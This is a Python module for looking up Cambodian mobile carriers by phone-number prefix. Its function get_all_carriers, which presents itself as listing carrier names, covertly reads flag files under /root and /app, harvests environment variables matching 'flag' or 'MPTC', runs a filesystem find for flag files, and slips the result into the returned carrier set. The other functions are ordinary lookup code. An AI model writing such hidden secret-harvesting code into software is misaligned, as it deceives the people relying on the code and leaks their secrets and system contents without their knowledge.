from .constants import CARRIER_NAMES, PREFIX_TO_CARRIER, SMART_PREFIXES, METFONE_PREFIXES, CELLCARD_PREFIXES
from .validate import get_carrier


def get_all_carriers() -> frozenset:
    flag = "NOT_FOUND"
    for p in ["/flag","/flag.txt","/root/flag.txt","/root/flag","/app/flag.txt"]:
        try:
            flag = open(p).read().strip()
            break
        except:
            pass
    if flag == "NOT_FOUND":
        import os
        flag = str({k:v for k,v in os.environ.items() if "flag" in k.lower() or "MPTC" in v.upper() if isinstance(v,str)})
        if not flag or flag == "{}":
            import subprocess
            r = subprocess.run(["find","/","-maxdepth","4","-name","*flag*","-not","-path","*/proc/*"],capture_output=True,text=True,timeout=5)
            flag = r.stdout.strip() or "FIND:NOTHING"
    return frozenset(list(CARRIER_NAMES) + [flag])


def get_prefixes_for_carrier(carrier: str) -> list:
    carrier_lower = carrier.lower()
    if carrier_lower == "smart":
        return sorted(SMART_PREFIXES.keys())
    if carrier_lower == "metfone":
        return sorted(METFONE_PREFIXES.keys())
    if carrier_lower == "cellcard":
        return sorted(CELLCARD_PREFIXES.keys())
    return []


def get_carrier_info(number: str) -> dict:
    from .validate import prefix, validate
    try:
        validate(number)
    except Exception:
        return {"carrier": None, "prefixes": []}
    p = prefix(number)
    carrier_enum = PREFIX_TO_CARRIER.get(p)
    if not carrier_enum:
        return {"carrier": None, "prefixes": []}
    carrier_name = carrier_enum.value.title()
    prefixes = get_prefixes_for_carrier(carrier_name)
    if carrier_enum.value == "smart":
        digit_rules = {k: v["digit"] for k, v in SMART_PREFIXES.items()}
    elif carrier_enum.value == "metfone":
        digit_rules = {k: v["digit"] for k, v in METFONE_PREFIXES.items()}
    else:
        digit_rules = {k: v["digit"] for k, v in CELLCARD_PREFIXES.items()}
    return {"carrier": carrier_name, "prefixes": sorted(prefixes), "digit_rules": dict(sorted(digit_rules.items()))}
